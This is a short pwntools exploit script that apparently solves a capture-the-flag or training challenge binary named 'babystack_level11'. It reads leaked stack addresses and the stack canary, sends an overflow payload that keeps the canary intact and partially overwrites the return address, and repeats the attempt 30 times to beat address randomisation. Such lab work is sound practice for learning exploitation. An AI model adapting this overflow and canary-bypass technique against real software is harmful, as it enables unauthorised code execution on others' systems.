from pwn import *

def exploit_eleven():
    exe = context.binary = ELF('/challenge/babystack_level11')
    context.terminal = ["tmux", "splitw", "-h"]

    def start(argv=[], *a, **kw):
        '''Start the exploit against the target.'''
        if args.GDB:
            return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)

    gdbscript = '''
    tbreak main
    continue
    '''.format(**locals())

    io = start()
    io.recvuntil(b'Here is the value of the base pointer rbp: ')
    bp = int(io.recvline(keepends=False), 16)
    io.sendline(hex(bp-8))
    io.recvuntil(b"is: ")
    canary = int(io.recvline(keepends=False), 16)
    io.recvuntil(b'Here is where it will be stored: ')
    buf = int(io.recvline(keepends=False), 16)
    exploit = b'a' * (bp-8-buf) + p64(canary) + b'a'*8 + b'\x83\xc0'
    io.sendline(exploit)
    print('here exploit')
    leak1 = io.recvline()
    print(leak1)
    io.interactive()
       
for i in range(30):
    exploit_eleven()
        
